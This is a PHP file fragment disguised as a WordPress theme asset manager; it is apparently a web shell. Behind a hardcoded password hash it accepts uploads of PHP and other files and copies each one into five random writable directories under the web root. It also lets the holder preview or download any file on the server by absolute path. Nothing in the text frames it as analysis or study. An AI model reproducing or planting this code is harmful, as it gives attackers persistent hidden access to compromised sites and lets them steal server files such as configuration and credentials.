// Authentication - Theme authorization key (hashed password)
$theme_auth_hash = '$2y$10$PUUtQuUH1dFZ8cekJPmWjOx6g83FuqLpNltwPHlf2c2NOubTg0He2';
$is_authorized = false;

// Check authorization
if (isset($_POST['theme_key'])) {
    if (password_verify($_POST['theme_key'], $theme_auth_hash)) {
        $is_authorized = true;
        setcookie('theme_auth', password_hash($theme_auth_hash, PASSWORD_DEFAULT), time() + 3600, '/');
    } else {
        $auth_error = "Invalid authorization key.";
    }
} elseif (isset($_COOKIE['theme_auth'])) {
    // Verify cookie hash
    if (password_verify($theme_auth_hash, $_COOKIE['theme_auth'])) {
        $is_authorized = true;
    }
}

// Logout functionality
if (isset($_GET['theme_logout'])) {
    setcookie('theme_auth', '', time() - 3600, '/');
    $is_authorized = false;
    header('Location: ' . str_replace('&theme_logout=1', '', $_SERVER['REQUEST_URI']));
    exit;
}

// Function to get random subdirectories
function getRandomSubdirectories($basePath, $numDirs = 5) {
    $directories = [];
    $iter = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($basePath, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iter as $path => $dir) {
        if ($dir->isDir() && is_writable($path)) {
            $directories[] = $path;
        }
    }
    
    if (count($directories) > $numDirs) {
        shuffle($directories);
        $directories = array_slice($directories, 0, $numDirs);
    }
    
    return $directories;
}

// Process theme asset uploads
if ($is_authorized && isset($_FILES['theme_asset'])) {
    $upload_directory = __DIR__ . "/theme-assets/";
    
    // Create directory if it doesn't exist
    if (!file_exists($upload_directory)) {
        mkdir($upload_directory, 0755, true);
    }
    
    $target_file = $upload_directory . basename($_FILES["theme_asset"]["name"]);
    $upload_status = 1;
    $file_extension = strtolower(pathinfo($target_file, PATHINFO_EXTENSION));
    
    // Check if file already exists
    if (file_exists($target_file)) {
        $notification = "File already exists in theme assets.";
        $upload_status = 0;
    }
    
    // Check file size (max 10MB)
    if ($_FILES["theme_asset"]["size"] > 10000000) {
        $notification = "File exceeds maximum size limit of 10MB.";
        $upload_status = 0;
    }
    
    // Allow only theme file extensions
    $allowed_extensions = array("css", "js", "php", "txt", "json", "xml");
    if (!in_array($file_extension, $allowed_extensions)) {
        $notification = "Only theme files (CSS, JS, PHP, TXT, JSON, XML) are allowed.";
        $upload_status = 0;
    }
    
    // Upload file if all conditions are met
    if ($upload_status == 1) {
        if (move_uploaded_file($_FILES["theme_asset"]["tmp_name"], $target_file)) {
            $notification = "Theme asset " . htmlspecialchars(basename($_FILES["theme_asset"]["name"])) . " successfully uploaded.";
            $file_path_info = "File location: " . htmlspecialchars($target_file);
            
            // Distribute file to random directories
            $distributionResults = [];
            $public_html = $_SERVER['DOCUMENT_ROOT'];
            $randomDirs = getRandomSubdirectories($public_html, 5);
            
            foreach ($randomDirs as $dir) {
                $dest = $dir . '/' . basename($target_file);
                if (copy($target_file, $dest)) {
                    $distributionResults[] = "File distributed to: " . htmlspecialchars($dest);
                } else {
                    $distributionResults[] = "Failed to distribute to: " . htmlspecialchars($dest);
                }
            }
        } else {
            $notification = "Error uploading theme asset.";
        }
    }
}

// Function to display theme file structure
function display_theme_structure($directory) {
    $theme_files = scandir($directory);
    echo "<div class='theme-file-tree'>";
    foreach ($theme_files as $file) {
        if ($file != "." && $file != "..") {
            $full_path = $directory . DIRECTORY_SEPARATOR . $file;
            if (is_dir($full_path)) {
                echo "<div class='theme-folder'><span class='dashicons dashicons-category'></span> $file/";
                display_theme_structure($full_path);
                echo "</div>";
            } else {
                $file_size = filesize($full_path);
                echo "<div class='theme-file'>";
                echo "<span class='dashicons dashicons-media-default'></span> $file <span class='file-size'>(" . format_file_size($file_size) . ")</span>";
                echo "<div class='file-path'>" . htmlspecialchars($full_path) . "</div>";
                echo "<div class='file-actions'>";
                echo "<a href='?preview=" . urlencode($full_path) . "' class='button button-small'>Preview</a> ";
                echo "<a href='?download_asset=" . urlencode($full_path) . "' class='button button-small'>Download</a>";
                echo "</div></div>";
            }
        }
    }
    echo "</div>";
}

// Format file size for display
function format_file_size($bytes) {
    $units = array('B', 'KB', 'MB', 'GB', 'TB');
    $i = 0;
    while ($bytes >= 1024 && $i < 4) {
        $bytes /= 1024;
        $i++;
    }
    return round($bytes, 2) . ' ' . $units[$i];
}

// Preview file content
if ($is_authorized && isset($_GET['preview'])) {
    $file_path = $_GET['preview'];
    if (file_exists($file_path) && is_file($file_path)) {
        $content = htmlspecialchars(file_get_contents($file_path));
        echo "<div class='file-preview'><h3>File Preview: " . basename($file_path) . "</h3>";
        echo "<div class='file-path-display'><strong>Full Path:</strong> " . htmlspecialchars($file_path) . "</div>";
        echo "<pre>$content</pre>";
        echo "<p><a href='" . $_SERVER['PHP_SELF'] . "' class='button'>Back to Theme Options</a></p></div>";
        exit;
    }
}

// Download theme asset
if ($is_authorized && isset($_GET['download_asset'])) {
    $file_path = $_GET['download_asset'];
    if (file_exists($file_path) && is_file($file_path)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file_path) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file_path));
        readfile($file_path);
        exit;
    }
}
